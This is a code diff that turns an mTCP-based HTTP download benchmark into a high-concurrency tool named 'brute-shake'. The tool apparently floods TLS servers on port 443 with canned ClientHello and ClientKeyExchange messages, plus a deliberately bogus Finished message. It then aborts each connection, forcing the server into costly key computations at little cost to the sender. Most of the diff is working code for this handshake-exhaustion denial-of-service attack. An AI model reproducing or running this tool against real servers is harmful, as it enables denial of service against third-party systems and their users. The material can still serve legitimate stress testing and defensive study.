@@ -16,6 +16,14 @@
 #include <sys/queue.h>
 #include <assert.h>
 
+#include <string.h>
+#include <sys/uio.h>
+#include <netdb.h>
+#include <openssl/x509.h>
+#include <openssl/rsa.h>
+#include <openssl/err.h>
+
+
 #include <mtcp_api.h>
 #include <mtcp_epoll.h>
 #include "cpu.h"
@@ -55,6 +63,7 @@
 #define ERROR (-1)
 #endif
 
+
 /*----------------------------------------------------------------------------*/
 static pthread_t app_thread[MAX_CPUS];
 static mctx_t g_mctx[MAX_CPUS];
@@ -63,11 +72,8 @@ static int done[MAX_CPUS];
 static int num_cores;
 static int core_limit;
 /*----------------------------------------------------------------------------*/
-static int fio = FALSE;
-static char outfile[MAX_FILE_LEN + 1];
 /*----------------------------------------------------------------------------*/
 static char host[MAX_IP_STR_LEN + 1];
-static char url[MAX_URL_LEN + 1];
 static in_addr_t daddr;
 static in_port_t dport;
 static in_addr_t saddr;
@@ -76,7 +82,6 @@ static int total_flows;
 static int flows[MAX_CPUS];
 static int flowcnt = 0;
 static int concurrency;
-static int num_ip;
 static int max_fds;
 static int response_size = 0;
 /*----------------------------------------------------------------------------*/
@@ -117,25 +122,102 @@ typedef struct thread_context* thread_context_t;
 /*----------------------------------------------------------------------------*/
 struct wget_vars
 {
-	int request_sent;
+	int clienthello_sent;
+	int clientkeyexchange_sent;
 
 	char response[HTTP_HEADER_LEN];
-	int resp_len;
-	int headerset;
-	uint32_t header_len;
-	uint64_t file_len;
 	uint64_t recv;
 	uint64_t write;
 
 	struct timeval t_start;
 	struct timeval t_end;
 	
-	int fd;
 };
 /*----------------------------------------------------------------------------*/
 static struct thread_context *g_ctx[MAX_CPUS];
 static struct wget_stat *g_stat[MAX_CPUS];
 /*----------------------------------------------------------------------------*/
+
+/* Canned client messages */
+
+unsigned char client_hello[] = {
+  /* TLS 1.0: Handshake Protocol */
+  0x16, 0x03, 0x01,
+  0x00, 0x76, /* length */
+  /* Client Hello */
+  0x01, 0x00, 0x00, 0x72,
+  0x03, 0x02,             /* TLS 1.2 */
+  0xb5, 0x3d, 0xee, 0x64, /* Unix time (not required to be correct) */
+  /* Random value */
+  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+  0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d,
+  0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14,
+  0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b,
+  /* No session ID, cipher suite nor compression method */
+
+/*
+canned client hello from:
+openssl s_client -no_comp -no_tls1_2 -no_ticket -msg -cipher 'ECDHE-RSA-AES256-SHA' -connect 10.9.9.16:443
+    01 00 00 72 03 02 bb 49 90 02 63 75 b3 97 b1 07
+    15 4b 3f 0b d3 83 75 ac 56 3a 8f fc 1d 7c b1 97
+    b4 da 21 1d e0 8a 00 00 04 c0 14 00 ff 01 00 00
+    45 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00
+    0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00
+    16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00
+    05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00
+    11 00 0f 00 01 01
+*/
+  0x00, 0x00, 0x04, 0xc0, 0x14, 0x00, 0xff,
+  0x01, 0x00, 0x00, 0x45, 0x00, 0x0b, 0x00,
+  0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a,
+  0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00,
+  0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
+  0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00,
+  0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06,
+  0x00, 0x07, 0x00, 0x14, 0x00, 0x15, 0x00,
+  0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13,
+  0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00,
+  0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x0f,
+  0x00, 0x01, 0x01
+};
+
+int len_client_key_exchange;
+unsigned char client_key_exchange[500] = {
+  /* TLS 1.0: Handshake Protocol */
+  0x16, 0x03, 0x02,
+  0x00, 0x46,               /* Length, will be written later */
+  0x10, 0x00, 0x00, 0x42, 0x41, 0x04, 0x9f, 0x41,
+  0xbc, 0xd7, 0xbb, 0x78, 0xf4, 0xe0, 0x22, 0x38,
+  0x6e, 0xe5, 0x27, 0xe3, 0x49, 0x41, 0x38, 0xdb,
+  0xf6, 0xdd, 0x50, 0x63, 0xd7, 0x8a, 0x69, 0x47,
+  0x57, 0x55, 0xa5, 0x6c, 0xdb, 0xe5, 0x71, 0x6e,
+  0xdc, 0x11, 0x5d, 0xdf, 0x22, 0x03, 0x39, 0x64,
+  0xcb, 0xf8, 0xad, 0x4e, 0xb6, 0x08, 0x64, 0xf8,
+  0xad, 0x29, 0x6f, 0x72, 0xf2, 0xee, 0xa7, 0x9c,
+  0x02, 0x13, 0xbb, 0x45, 0x1e, 0x3c
+                            /* Client Key Exchange */
+            /* Length, this is above length minus 4 */
+};
+unsigned char change_cipher_spec[] = {
+  0x14, 0x03, 0x01, 0x00, 0x01, 0x01
+};
+
+unsigned char client_finished[] = {
+  /* TLS 1.0: Handshake Protocol */
+  0x16, 0x03, 0x01,
+  0x00, 0x24,
+  /* Bogus content, the server will need to do some computation before
+     being able to decrypt that. We just ship it just in case it waits
+     for an encrypted message to start doing computations. */
+  0x8f, 0x2c, 0xf7, 0xa1, 0x92, 0x4e, 0x6d, 0x76,
+  0xdc, 0x51, 0x89, 0x57, 0x20, 0x79, 0x45, 0xd6,
+  0x5b, 0xe8, 0x21, 0x9e, 0x65, 0xb9, 0x87, 0x89,
+  0x8c, 0x8f, 0xb8, 0x17, 0xa6, 0xf0, 0xde, 0xbb,
+  0x8e, 0x2a, 0x21, 0x92
+};
+
+
+
 thread_context_t 
 CreateContext(int core)
 {
@@ -196,7 +278,7 @@ CreateConnection(thread_context_t ctx)
 	if (ret < 0) {
 		if (errno != EINPROGRESS) {
 			perror("mtcp_connect");
-			mtcp_close(mctx, sockid);
+			mtcp_abort(mctx, sockid);
 			return -1;
 		}
 	}
@@ -216,7 +298,7 @@ inline void
 CloseConnection(thread_context_t ctx, int sockid)
 {
 	mtcp_epoll_ctl(ctx->mctx, ctx->ep, MTCP_EPOLL_CTL_DEL, sockid, NULL);
-	mtcp_close(ctx->mctx, sockid);
+	mtcp_abort(ctx->mctx, sockid);
 	ctx->pending--;
 	ctx->done++;
 	assert(ctx->pending >= 0);
@@ -229,34 +311,24 @@ CloseConnection(thread_context_t ctx, int sockid)
 }
 /*----------------------------------------------------------------------------*/
 static inline int 
-SendHTTPRequest(thread_context_t ctx, int sockid, struct wget_vars *wv)
+SendClientHello(thread_context_t ctx, int sockid, struct wget_vars *wv)
 {
-	char request[HTTP_HEADER_LEN];
 	struct mtcp_epoll_event ev;
 	int wr;
 	int len;
 
-	wv->headerset = FALSE;
 	wv->recv = 0;
-	wv->header_len = wv->file_len = 0;
 
-	snprintf(request, HTTP_HEADER_LEN, "GET %s HTTP/1.0\r\n"
-			"User-Agent: Wget/1.12 (linux-gnu)\r\n"
-			"Accept: */*\r\n"
-			"Host: %s\r\n"
-//			"Connection: Keep-Alive\r\n\r\n", 
-			"Connection: Close\r\n\r\n", 
-			url, host);
-	len = strlen(request);
+	len = sizeof(client_hello);
 
-	wr = mtcp_write(ctx->mctx, sockid, request, len);
+	wr = mtcp_write(ctx->mctx, sockid, client_hello, len);
 	if (wr < len) {
-		TRACE_ERROR("Socket %d: Sending HTTP request failed. "
+		TRACE_ERROR("Socket %d: Sending Client Hello failed. "
 				"try: %d, sent: %d\n", sockid, len, wr);
 	}
 	ctx->stat.writes += wr;
-	TRACE_APP("Socket %d HTTP Request of %d bytes. sent.\n", sockid, wr);
-	wv->request_sent = TRUE;
+	TRACE_APP("Socket %d Client Hello of %d bytes. sent.\n", sockid, wr);
+	wv->clienthello_sent = TRUE;
 
 	ev.events = MTCP_EPOLLIN;
 	ev.data.sockid = sockid;
@@ -264,19 +336,53 @@ SendHTTPRequest(thread_context_t ctx, int sockid, struct wget_vars *wv)
 
 	gettimeofday(&wv->t_start, NULL);
 
-	char fname[MAX_FILE_LEN + 1];
-	if (fio) {
-		snprintf(fname, MAX_FILE_LEN, "%s.%d", outfile, flowcnt++);
-		wv->fd = open(fname, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-		if (wv->fd < 0) {
-			TRACE_APP("Failed to open file descriptor for %s\n", fname);
-			exit(1);
-		}
-	}
 
 	return 0;
 }
 /*----------------------------------------------------------------------------*/
+
+/*----------------------------------------------------------------------------*/
+static inline int
+SendClientKeyExchange(thread_context_t ctx, int sockid, struct wget_vars *wv)
+{
+        struct mtcp_epoll_event ev;
+        int wr;
+        int len;
+
+        wv->recv = 0;
+
+	len = sizeof(client_key_exchange)
+		 + sizeof(change_cipher_spec)
+		 + sizeof(client_finished);
+
+        struct iovec msg[3] = {
+    		{ client_key_exchange, sizeof(client_key_exchange) },
+    		{ change_cipher_spec, sizeof(change_cipher_spec) },
+    		{ client_finished, sizeof(client_finished) }
+  	};
+
+        wr = mtcp_writev(ctx->mctx, sockid, msg, 3);
+
+        if (wr != len) {
+                TRACE_ERROR("Socket %d: Sending Client KeyExchange failed. "
+                                "try: %d, sent: %d\n", sockid, len, wr);
+        }
+
+        ctx->stat.writes += wr;
+        TRACE_APP("Socket %d Client KeyExchange of %d bytes. sent.\n", sockid, wr);
+        wv->clientkeyexchange_sent = TRUE;
+
+        ev.events = MTCP_EPOLLIN;
+        ev.data.sockid = sockid;
+        mtcp_epoll_ctl(ctx->mctx, ctx->ep, MTCP_EPOLL_CTL_MOD, sockid, &ev);
+
+        gettimeofday(&wv->t_start, NULL);
+
+
+        return 0;
+}
+/*----------------------------------------------------------------------------*/
+
 static inline int 
 DownloadComplete(thread_context_t ctx, int sockid, struct wget_vars *wv)
 {
@@ -285,17 +391,18 @@ DownloadComplete(thread_context_t ctx, int sockid, struct wget_vars *wv)
 #endif
 	uint64_t tdiff;
 
-	TRACE_APP("Socket %d File download complete!\n", sockid);
+	TRACE_APP("Socket %d Server Hello complete!\n", sockid);
 	gettimeofday(&wv->t_end, NULL);
-	CloseConnection(ctx, sockid);
+	if (wv->clientkeyexchange_sent)
+		CloseConnection(ctx, sockid);
 	ctx->stat.completes++;
 	if (response_size == 0) {
 		response_size = wv->recv;
 		fprintf(stderr, "Response size set to %d\n", response_size);
 	} else {
 		if (wv->recv != response_size) {
-			fprintf(stderr, "Response size mismatch! mine: %ld, theirs: %d\n", 
-					wv->recv, response_size);
+			//fprintf(stderr, "Response size mismatch! mine: %ld, theirs: %d\n", 
+			//		wv->recv, response_size);
 		}
 	}
 	tdiff = (wv->t_end.tv_sec - wv->t_start.tv_sec) * 1000000 + 
@@ -311,19 +418,19 @@ DownloadComplete(thread_context_t ctx, int sockid, struct wget_vars *wv)
 	if (tdiff > ctx->stat.max_resp_time)
 		ctx->stat.max_resp_time = tdiff;
 
-	if (fio && wv->fd > 0)
-		close(wv->fd);
 
 	return 0;
 }
 /*----------------------------------------------------------------------------*/
 static inline int
-HandleReadEvent(thread_context_t ctx, int sockid, struct wget_vars *wv)
+ReceiveServerHello(thread_context_t ctx, int sockid, int quick, struct wget_vars *wv)
 {
 	mctx_t mctx = ctx->mctx;
+	 u_int16_t len, rd, r, m;
+	unsigned char *p, *q;
+	int len_server_hello = 0;
 	char buf[BUF_SIZE];
-	char *pbuf;
-	int rd, copy_len;
+	X509          *cert = NULL;
 
 	rd = 1;
 	while (rd > 0) {
@@ -331,140 +438,141 @@ HandleReadEvent(thread_context_t ctx, int sockid, struct wget_vars *wv)
 		if (rd <= 0)
 			break;
 		ctx->stat.reads += rd;
-
-		TRACE_APP("Socket %d: mtcp_read ret: %d, total_recv: %lu, "
-				"header_set: %d, header_len: %u, file_len: %lu\n", 
-				sockid, rd, wv->recv + rd, 
-				wv->headerset, wv->header_len, wv->file_len);
-
-		pbuf = buf;
-		if (!wv->headerset) {
-			copy_len = MIN(rd, HTTP_HEADER_LEN - wv->resp_len);
-			memcpy(wv->response + wv->resp_len, buf, copy_len);
-			wv->resp_len += copy_len;
-			wv->header_len = find_http_header(wv->response, wv->resp_len);
-			if (wv->header_len > 0) {
-				wv->response[wv->header_len] = '\0';
-				wv->file_len = http_header_long_val(wv->response, 
-						CONTENT_LENGTH_HDR, sizeof(CONTENT_LENGTH_HDR) - 1);
-				TRACE_APP("Socket %d Parsed response header. "
-						"Header length: %u, File length: %lu (%luMB)\n", 
-						sockid, wv->header_len, 
-						wv->file_len, wv->file_len / 1024 / 1024);
-				wv->headerset = TRUE;
-				wv->recv += (rd - (wv->resp_len - wv->header_len));
-				rd = (wv->resp_len - wv->header_len);
-				
-				pbuf += (rd - (wv->resp_len - wv->header_len));
-				//printf("Successfully parse header.\n");
-				//fflush(stdout);
-
-			} else {
-				/* failed to parse response header */
-#if 0
-				printf("[CPU %d] Socket %d Failed to parse response header."
-						" Data: \n%s\n", ctx->core, sockid, wv->response);
-				fflush(stdout);
-#endif
-				wv->recv += rd;
-				rd = 0;
-				ctx->stat.errors++;
-				ctx->errors++;
-				CloseConnection(ctx, sockid);
-				return 0;
-			}
-			//pbuf += wv->header_len;
-			//wv->recv += wv->header_len;
-			//rd -= wv->header_len;
-		}
+		len_server_hello += rd;
 		wv->recv += rd;
+
+		r = len_server_hello;
+		p = buf;
+
+		TRACE_APP("Socket %d: mtcp_read ret: %d, total_recv: %lu\n", sockid, rd, wv->recv + rd);
+
+		/* Server Hello */
+		if (r < 1) continue;
 		
-		if (fio && wv->fd > 0) {
-			int wr = 0;
-			while (wr < rd) {
-				int _wr = write(wv->fd, pbuf + wr, rd - wr);
-				assert (_wr == rd - wr);
-				 if (_wr < 0) {
-					 perror("write");
-					 TRACE_ERROR("Failed to write.\n");
-					 assert(0);
-					 break;
-				 }
-				 wr += _wr;	
-				 wv->write += _wr;
+		if (*p != 0x16) {
+			fprintf(stderr, "Did not get a Server Hello record handshake (%x)\n", *p);
+		}
+
+		r--; p++;
+		if (r < 2) continue;
+
+		if (*p != 0x03 || *(p + 1) != 0x02) {
+			fprintf(stderr, "Server does not support TLS1.1\n");
+		}
+
+		r -= 2; p += 2;
+		if (r < 2) continue;
+		memcpy(&len, p, 2); len = htons(len);
+		r -= 2; p += 2;
+		if (r < len) continue;
+
+		if (r < 4) {
+			fprintf(stderr, "TLS record too short");
+		}
+		if (*p != 0x02) {
+			fprintf(stderr, "Not a Server Hello (%x)\n", *p);
+		}
+
+		r -= len; p += len;
+
+		/* Certificate */
+		if (r < 1) continue;
+
+		if (*p != 0x16) {
+			fprintf(stderr, "Did not get a Certificate record handshake (%x)\n", *p);
+		}
+
+    		r--; p++;
+		if (r < 4) continue;
+		r -= 2; p += 2;
+		memcpy(&len, p, 2); len = htons(len);
+		r -= 2; p += 2;
+		if (r < len) continue;
+
+		if (r < 4) {
+			fprintf(stderr, "TLS record too short\n");
+		}
+		if (*p != 0xb) {
+			fprintf(stderr, "Not a Certificate (%x)\n", *p);
+		}
+
+		if (!quick) {
+		/* We'll grab the first certificate. We assume they are shipped in
+		the correct order. */
+			if (len < 10) {
+				fprintf(stderr, "Too short for a certificate list");
 			}
-		}
+			if (*(p + 7) != 0) {
+				fprintf(stderr, "Certificate too big");
+			}
+			memcpy(&m, p + 8, 2); m = htons(m);
+			if (len < m + 10) {
+				fprintf(stderr, "Incorrect certificate size");
+			}
+		/* Certificate is length m and at p + 10 */
+			q = p + 10;
+			if ((cert = d2i_X509(NULL, (const unsigned char **)&q, m)) == NULL) {
+				fprintf(stderr, "Unable to parse X509 certificate:\n%s",
+             				ERR_error_string(ERR_get_error(), NULL));
+			}
+    		}
+    		r -= len; p += len;
 		
-		if (wv->header_len && (wv->recv >= wv->header_len + wv->file_len)) {
-			break;
+		    /* Server Hello Done */
+		if (r < 1) continue;
+		if (*p != 0x16) {
+			fprintf(stderr,"Did not get a Server Hello Done record handshake (%x)\n", *p);
 		}
-	}
+    		r--; p++;
+    		if (r < 4) continue;
+    		r -= 2; p += 2;
+    		memcpy(&len, p, 2); len = htons(len);
+    		r -= 2; p += 2;
+    		if (r < len) continue;
+    		if (r < 4) {
+      			fprintf(stderr,"TLS record too short");
+		}
+    		r -= len; p += len;
+    		break;
+  	}
+
 
 	if (rd > 0) {
-		if (wv->header_len && (wv->recv >= wv->header_len + wv->file_len)) {
-			TRACE_APP("Socket %d Done Write: "
-					"header: %u file: %lu recv: %lu write: %lu\n", 
-					sockid, wv->header_len, wv->file_len, 
-					wv->recv - wv->header_len, wv->write);
+		if (wv->recv >= len_server_hello) {
+			TRACE_APP("Socket %d Done Write: recv: %lu \n", sockid,  wv->recv);
 			DownloadComplete(ctx, sockid, wv);
+  			return 0;
 
-			return 0;
 		}
 
 	} else if (rd == 0) {
 		/* connection closed by remote host */
 		TRACE_DBG("Socket %d connection closed with server.\n", sockid);
 
-		if (wv->header_len && (wv->recv >= wv->header_len + wv->file_len)) {
+		if (wv->recv >= len_server_hello) {
 			DownloadComplete(ctx, sockid, wv);
 		} else {
 			ctx->stat.errors++;
 			ctx->incompletes++;
-			CloseConnection(ctx, sockid);
+			if (wv->clientkeyexchange_sent)
+				CloseConnection(ctx, sockid);
 		}
 
 	} else if (rd < 0) {
 		if (errno != EAGAIN) {
-			TRACE_DBG("Socket %d: mtcp_read() error %s\n", 
+			//TRACE_DBG("Socket %d: mtcp_read() error %s\n", 
+			//		sockid, strerror(errno));
+			fprintf(stderr,"Socket %d: mtcp_read() error %s\n", 
 					sockid, strerror(errno));
 			ctx->stat.errors++;
 			ctx->errors++;
-			CloseConnection(ctx, sockid);
+			if (wv->clientkeyexchange_sent)
+				CloseConnection(ctx, sockid);
 		}
 	}
 
 	return 0;
 }
-/*----------------------------------------------------------------------------*/
-#if 0
-void 
-PrintStats()
-{
-#define LINE_LEN 2048
-	char line[LINE_LEN];
-	int total_trans;
-	int i;
-
-	total_trans = 0;
-	line[0] = '\0';
-	//sprintf(line, "Trans/s: ");
-	for (i = 0; i < core_limit; i++) {
-		//sprintf(line + strlen(line), "%6d  ", g_trans[i]);
-		sprintf(line + strlen(line), "[CPU%2d] %7d trans/s  ", i, g_trans[i]);
-		total_trans += g_trans[i];
-		g_trans[i] = 0;
-		if (i % 4 == 3)
-			sprintf(line + strlen(line), "\n");
-	}
-	fprintf(stderr, "%s", line);
-	fprintf(stderr, "[ ALL ] %7d trans/s\n", total_trans);
-	//sprintf(line + strlen(line), "total: %6d", total_trans);
-	//printf("%s\n", line);
-
-	//fprintf(stderr, "Transactions/s: %d\n", total_trans);
-	fflush(stderr);
-}
-#endif
 /*----------------------------------------------------------------------------*/
 static void 
 PrintStats()
@@ -548,7 +656,7 @@ RunWgetMain(void *arg)
 	g_stat[core] = &ctx->stat;
 	srand(time(NULL));
 
-	mtcp_init_rss(mctx, saddr, num_ip, daddr, 1, dport);
+	mtcp_init_rss(mctx, saddr, IP_RANGE, daddr, 1, dport);
 
 	n = flows[core];
 	if (n == 0) {
@@ -639,16 +747,19 @@ RunWgetMain(void *arg)
 				CloseConnection(ctx, events[i].data.sockid);
 
 			} else if (events[i].events & MTCP_EPOLLIN) {
-				HandleReadEvent(ctx, 
-						events[i].data.sockid, &wvars[events[i].data.sockid]);
+				struct wget_vars *wv = &wvars[events[i].data.sockid];
+				SendClientKeyExchange(ctx, events[i].data.sockid, wv);
+				CloseConnection(ctx, events[i].data.sockid);
+				//ReceiveServerHello(ctx, 
+				//		events[i].data.sockid, 1, &wvars[events[i].data.sockid]);
 
 			} else if (events[i].events == MTCP_EPOLLOUT) {
 				struct wget_vars *wv = &wvars[events[i].data.sockid];
 
-				if (!wv->request_sent) {
-					SendHTTPRequest(ctx, events[i].data.sockid, wv);
+				if (!wv->clienthello_sent) {
+					SendClientHello(ctx, events[i].data.sockid, wv);
 				} else {
-					//TRACE_DBG("Request already sent.\n");
+					CloseConnection(ctx, events[i].data.sockid);
 				}
 
 			} else {
@@ -697,7 +808,7 @@ main(int argc, char **argv)
 
 	if (argc < 3) {
 		TRACE_CONFIG("Too few arguments!\n");
-		TRACE_CONFIG("Usage: %s url #flows [output]\n", argv[0]);
+		TRACE_CONFIG("Usage: %s host #flows\n", argv[0]);
 		return FALSE;
 	}
 
@@ -706,17 +817,10 @@ main(int argc, char **argv)
 		return FALSE;
 	}
 
-	char* slash_p = strchr(argv[1], '/');
-	if (slash_p) {
-		strncpy(host, argv[1], slash_p - argv[1]);
-		strncpy(url, strchr(argv[1], '/'), MAX_URL_LEN);
-	} else {
-		strncpy(host, argv[1], MAX_IP_STR_LEN);
-		strncpy(url, "/", 1);
-	}
+	strncpy(host, argv[1], MAX_IP_STR_LEN);
 
 	daddr = inet_addr(host);
-	dport = htons(80);
+	dport = htons(443);
 	saddr = INADDR_ANY;
 
 	total_flows = atoi(argv[2]);
@@ -739,14 +843,6 @@ main(int argc, char **argv)
 		} else if (strcmp(argv[i], "-c") == 0) {
 			total_concurrency = atoi(argv[i + 1]);
 
-		} else if (strcmp(argv[i], "-o") == 0) {
-			if (strlen(argv[i + 1]) > MAX_FILE_LEN) {
-				TRACE_CONFIG("Output file length should be smaller than %d!\n", 
-						MAX_FILE_LEN);
-				return FALSE;
-			}
-			fio = TRUE;
-			strncpy(outfile, argv[i + 1], MAX_FILE_LEN);
 		}
 	}
 
@@ -762,15 +858,12 @@ main(int argc, char **argv)
 	max_fds = concurrency * 3;
 
 	TRACE_CONFIG("Application configuration:\n");
-	TRACE_CONFIG("URL: %s\n", url);
+	TRACE_CONFIG("Host: %s\n", host);
 	TRACE_CONFIG("# of total_flows: %d\n", total_flows);
 	TRACE_CONFIG("# of cores: %d\n", core_limit);
 	TRACE_CONFIG("Concurrency: %d\n", total_concurrency);
-	if (fio) {
-		TRACE_CONFIG("Output file: %s\n", outfile);
-	}
 
-	ret = mtcp_init("/etc/mtcp/config/epwget.conf");
+	ret = mtcp_init("/etc/mtcp/config/brute-shake.conf");
 	if (ret) {
 		TRACE_ERROR("Failed to initialize mtcp.\n");
 		exit(EXIT_FAILURE);
@@ -779,7 +872,6 @@ main(int argc, char **argv)
 	mcfg.max_concurrency = max_fds;
 	mcfg.max_num_buffers = max_fds;
 	mtcp_setconf(&mcfg);
-	num_ip = mcfg.num_ip;
 
 	mtcp_register_signal(SIGINT, SignalHandler);
 
@@ -799,14 +891,14 @@ main(int argc, char **argv)
 		if (pthread_create(&app_thread[i], 
 					NULL, RunWgetMain, (void *)&cores[i])) {
 			perror("pthread_create");
-			TRACE_ERROR("Failed to create wget thread.\n");
+			TRACE_ERROR("Failed to create brute-shake thread.\n");
 			exit(-1);
 		}
 	}
 
 	for (i = 0; i < core_limit; i++) {
 		pthread_join(app_thread[i], NULL);
-		TRACE_INFO("Wget thread %d joined.\n", i);
+		TRACE_INFO("brute-shake thread %d joined.\n", i);
 	}
 
 	mtcp_destroy();
